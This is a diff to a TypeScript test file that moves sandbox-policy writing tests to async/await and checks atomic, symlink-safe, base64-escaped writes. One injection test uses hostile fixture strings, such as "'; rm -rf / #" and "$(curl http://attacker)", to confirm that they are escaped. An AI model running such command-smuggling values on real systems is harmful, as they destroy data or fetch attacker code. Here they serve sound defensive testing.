@@ -35,14 +35,14 @@ function fakeContext(sandboxName: string): PolicyContext {
 }
 
 describe("explainSandboxPolicy", () => {
-  it("renders the policy context as markdown by default", () => {
+  it("renders the policy context as markdown by default", async () => {
     const build = vi.fn(fakeContext);
     const render = vi.fn(() => "# rendered\n");
     const log = vi.fn();
     const logJson = vi.fn();
     const exec = vi.fn();
 
-    const ctx = explainSandboxPolicy("alpha", {}, { build, render, log, logJson, exec });
+    const ctx = await explainSandboxPolicy("alpha", {}, { build, render, log, logJson, exec });
 
     expect(build).toHaveBeenCalledWith("alpha");
     expect(render).toHaveBeenCalledWith(ctx);
@@ -51,14 +51,14 @@ describe("explainSandboxPolicy", () => {
     expect(exec).not.toHaveBeenCalled();
   });
 
-  it("emits JSON when the json flag is set", () => {
+  it("emits JSON when the json flag is set", async () => {
     const build = vi.fn(fakeContext);
     const render = vi.fn();
     const log = vi.fn();
     const logJson = vi.fn();
     const exec = vi.fn();
 
-    const ctx = explainSandboxPolicy(
+    const ctx = await explainSandboxPolicy(
       "alpha",
       { json: true },
       { build, render, log, logJson, exec },
@@ -70,7 +70,7 @@ describe("explainSandboxPolicy", () => {
     expect(exec).not.toHaveBeenCalled();
   });
 
-  it("writes the rendered context into the sandbox when writeToSandbox is set", () => {
+  it("writes the rendered context into the sandbox when writeToSandbox is set", async () => {
     const build = vi.fn(fakeContext);
     const render = vi.fn(() => "# rendered\n");
     const log = vi.fn();
@@ -82,7 +82,7 @@ describe("explainSandboxPolicy", () => {
     }));
     const warn = vi.fn();
 
-    explainSandboxPolicy(
+    await explainSandboxPolicy(
       "alpha",
       { writeToSandbox: true },
       { build, render, log, logJson, exec, warn },
@@ -95,7 +95,7 @@ describe("explainSandboxPolicy", () => {
     expect(warn).not.toHaveBeenCalled();
   });
 
-  it("warns when --write cannot reach the sandbox", () => {
+  it("warns when --write cannot reach the sandbox", async () => {
     const build = vi.fn(fakeContext);
     const render = vi.fn(() => "# rendered\n");
     const log = vi.fn();
@@ -103,7 +103,7 @@ describe("explainSandboxPolicy", () => {
     const exec = vi.fn(() => null);
     const warn = vi.fn();
 
-    explainSandboxPolicy(
+    await explainSandboxPolicy(
       "alpha",
       { writeToSandbox: true },
       { build, render, log, logJson, exec, warn },
@@ -114,7 +114,7 @@ describe("explainSandboxPolicy", () => {
     expect(warn.mock.calls[0][0]).toContain(POLICY_CONTEXT_SANDBOX_PATH);
   });
 
-  it("warns when --write fails with a non-zero exit", () => {
+  it("warns when --write fails with a non-zero exit", async () => {
     const build = vi.fn(fakeContext);
     const render = vi.fn(() => "# rendered\n");
     const log = vi.fn();
@@ -122,7 +122,7 @@ describe("explainSandboxPolicy", () => {
     const exec = vi.fn(() => ({ status: 13, stdout: "", stderr: "denied" }));
     const warn = vi.fn();
 
-    explainSandboxPolicy(
+    await explainSandboxPolicy(
       "alpha",
       { writeToSandbox: true },
       { build, render, log, logJson, exec, warn },
@@ -134,7 +134,7 @@ describe("explainSandboxPolicy", () => {
 });
 
 describe("writePolicyContextToSandbox", () => {
-  it("encodes the rendered markdown as base64 and pipes it through base64 -d", () => {
+  it("encodes the rendered markdown as base64 and pipes it through base64 -d", async () => {
     const build = vi.fn(fakeContext);
     const render = vi.fn(() => "hello sandbox\n");
     const exec = vi.fn((_sandbox: string, _command: string) => ({
@@ -143,7 +143,7 @@ describe("writePolicyContextToSandbox", () => {
       stderr: "",
     }));
 
-    const result = writePolicyContextToSandbox("alpha", { build, render, exec });
+    const result = await writePolicyContextToSandbox("alpha", { build, render, exec });
 
     expect(result.written).toBe(true);
     expect(exec).toHaveBeenCalledTimes(1);
@@ -153,7 +153,7 @@ describe("writePolicyContextToSandbox", () => {
     expect(command).toContain(POLICY_CONTEXT_SANDBOX_PATH);
   });
 
-  it("stages the payload in a sibling temp file and atomically replaces the target without following symlinks", () => {
+  it("stages the payload in a sibling temp file and atomically replaces the target without following symlinks", async () => {
     const build = vi.fn(fakeContext);
     const render = vi.fn(() => "payload\n");
     const exec = vi.fn((_sandbox: string, _command: string) => ({
@@ -162,7 +162,7 @@ describe("writePolicyContextToSandbox", () => {
       stderr: "",
     }));
 
-    writePolicyContextToSandbox("alpha", { build, render, exec });
+    await writePolicyContextToSandbox("alpha", { build, render, exec });
 
     const command = exec.mock.calls[0][1];
     // Payload must land in a freshly-minted temp file under the workspace
@@ -179,24 +179,24 @@ describe("writePolicyContextToSandbox", () => {
     expect(command).not.toMatch(/> \/sandbox\/\.openclaw\/workspace\/POLICY\.md/);
   });
 
-  it("returns sandbox-unreachable when exec yields null", () => {
+  it("returns sandbox-unreachable when exec yields null", async () => {
     const build = vi.fn(fakeContext);
     const render = vi.fn(() => "x");
     const exec = vi.fn(() => null);
 
-    const result = writePolicyContextToSandbox("alpha", { build, render, exec });
+    const result = await writePolicyContextToSandbox("alpha", { build, render, exec });
 
     expect(result.written).toBe(false);
     expect(result.reason).toBe("sandbox unreachable");
     expect(result.failure).toBe("sandbox-unreachable");
   });
 
-  it("returns a descriptive reason when the sandbox command exits non-zero", () => {
+  it("returns a descriptive reason when the sandbox command exits non-zero", async () => {
     const build = vi.fn(fakeContext);
     const render = vi.fn(() => "x");
     const exec = vi.fn(() => ({ status: 13, stdout: "", stderr: "denied" }));
 
-    const result = writePolicyContextToSandbox("alpha", { build, render, exec });
+    const result = await writePolicyContextToSandbox("alpha", { build, render, exec });
 
     expect(result.written).toBe(false);
     expect(result.reason).toContain("status 13");
@@ -214,7 +214,7 @@ describe("writePolicyContextToSandbox", () => {
     "evil",
   ])(
     "encodes hostile markdown payloads as base64 so they cannot break out of the write command [%s]",
-    (token) => {
+    async (token) => {
       const hostile = [
         "'; rm -rf / #",
         "$(curl http://attacker)",
@@ -234,7 +234,7 @@ describe("writePolicyContextToSandbox", () => {
         stderr: "",
       }));
 
-      writePolicyContextToSandbox("alpha", { build, render, exec });
+      await writePolicyContextToSandbox("alpha", { build, render, exec });
 
       const command = exec.mock.calls[0][1];
       const encoded = Buffer.from(hostile, "utf-8").toString("base64");
@@ -252,4 +252,26 @@ describe("writePolicyContextToSandbox", () => {
       expect(occurrences).toBeGreaterThanOrEqual(1);
     },
   );
+});
+
+it("awaits asynchronous context preparation and write failure without changing process.exit", async () => {
+  const original = process.exit;
+  let finishBuild!: (context: PolicyContext) => void;
+  const exec = vi.fn(async () => {
+    await Promise.resolve();
+    throw new Error("context write failed");
+  });
+  const pending = writePolicyContextToSandbox("alpha", {
+    build: () =>
+      new Promise<PolicyContext>((resolve) => {
+        finishBuild = resolve;
+      }),
+    render: () => "policy context",
+    exec,
+  });
+  expect(exec).not.toHaveBeenCalled();
+  expect(process.exit).toBe(original);
+  finishBuild(fakeContext("alpha"));
+  await expect(pending).rejects.toThrow("context write failed");
+  expect(process.exit).toBe(original);
 });
